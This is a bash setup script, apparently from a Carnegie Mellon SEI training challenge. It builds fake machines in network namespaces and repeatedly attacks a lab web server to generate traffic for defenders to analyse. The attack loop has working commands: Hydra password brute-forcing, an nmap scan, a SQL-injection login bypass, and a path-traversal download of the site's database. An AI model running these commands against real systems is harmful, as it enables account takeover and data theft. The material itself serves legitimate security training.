#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


#pull environment variables

oct1=$(vmtoolsd --cmd "info-get guestinfo.oct1")
oct2=$(vmtoolsd --cmd "info-get guestinfo.oct2")
oct3=$(vmtoolsd --cmd "info-get guestinfo.oct3")
oct4=$(vmtoolsd --cmd "info-get guestinfo.oct4")

#create fake machine namespaces

ip netns add machine1
ip netns add machine2
ip netns add machine3
ip netns add machine4

#give machines some NICs

ip link set dev eth1 netns machine1
ip link set dev eth2 netns machine2
ip link set dev eth3 netns machine3
ip link set dev eth4 netns machine4

#give machines loopback addys

ip -n machine1 link set dev eth1 up 
ip -n machine2 link set dev eth2 up
ip -n machine3 link set dev eth3 up 
ip -n machine4 link set dev eth4 up  

#make sure I'm in the right environment

Editing=##oct1##

if [[ $oct1 = $Editing ]] ; then

    echo Editing Challenge in TM in Templates
    ip -n machine1 address add 10.2.2.45/24 dev eth1
    ip -n machine2 address add 10.2.2.46/24 dev eth2
    ip -n machine3 address add 10.1.1.45/24 dev eth3
    ip -n machine4 address add 10.1.1.46/24 dev eth4
    else
    ip -n machine1 address add 10.2.2.$oct1/24 dev eth1
    ip -n machine2 address add 10.2.2.$oct2/24 dev eth2
    ip -n machine3 address add 10.1.1.$oct3/24 dev eth3
    ip -n machine4 address add 10.1.1.$oct4/24 dev eth4
fi

# setup loopbacks

ip -n machine1 link set lo up
ip -n machine2 link set lo up
ip -n machine3 link set lo up
ip -n machine4 link set lo up


#add default routes

ip -n machine1 route add 10.2.2.0/24 via 10.2.2.1 dev eth1
ip -n machine1 route add default via 10.2.2.1
ip -n machine2 route add 10.2.2.0/24 via 10.2.2.1 dev eth2
ip -n machine2 route add default via 10.2.2.1
ip -n machine3 route add 10.1.1.0/24 via 10.1.1.1 dev eth3
ip -n machine3 route add default via 10.1.1.1
ip -n machine4 route add 10.1.1.0/24 via 10.1.1.1 dev eth4
ip -n machine4 route add default via 10.1.1.1
   
# make sure web server is running before launching attacks
nc -zv 10.7.7.100 80 > /dev/null

while [ $? -eq 1 ]
    do
    sleep 5
    nc -zv 10.7.7.100 80 > /dev/null
done

while true; do

    #Execute commands within each namespace

    #fail brute force

    ip netns exec machine1 timeout 180 hydra -I -t 64 -l "admin@example.com" -P /home/user/Desktop/wordlist.txt -u sites.merch.codes -s 80 http-post-form "/?page=login:email=^USER^&password=^PASS^:F=Wrong E-mail-Address or Password" 
    ip netns exec machine3 timeout 180 hydra -I -t 64 -l "admin@example.com" -P /home/user/Desktop/wordlist.txt -u sites.merch.codes -s 80 http-post-form "/?page=login:email=^USER^&password=^PASS^:F=Wrong E-mail-Address or Password" 
    ip netns exec machine4 timeout 180 hydra -I -t 64 -l "admin@example.com" -P /home/user/Desktop/wordlist.txt -u sites.merch.codes -s 80 http-post-form "/?page=login:email=^USER^&password=^PASS^:F=Wrong E-mail-Address or Password" 

    #success brute force machine 2

    ip netns exec machine2 timeout 180 hydra -I -f -t 64 -l "admin@example.com" -P /home/user/Desktop/wordlistpass.txt -u  sites.merch.codes -s 80 http-post-form "/?page=login:email=^USER^&password=^PASS^:F=Wrong E-mail-Address or Password"

    #nmap machine3

    ip netns exec machine3 nmap -p 1-1000 -T4 -A 10.7.7.100
    
    #sql inject machine3
   
    ip netns exec machine3 curl -i -s -k -X $'POST' \
    -H $'Host: sites.merch.codes' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 30' -H $'Origin: http://10.7.7.100' -H $'Connection: close' -H $'Referer: http://10.7.7.100/?page=login' -H $'Upgrade-Insecure-Requests: 1' \
        -b $'PHPSESSID=3a7afa765ade09ed798e065a4fe84273' \
        --data-binary $'email=%27+or+1%3D1--&password=' \
        $'http://10.7.7.100/?page=login'
   
    # exfiltrate db machine3
    ip netns exec machine3 curl http://sites.merch.codes/download.php?file=./../../database/db.s3db --output ./db.s3db

    sleep 30

done
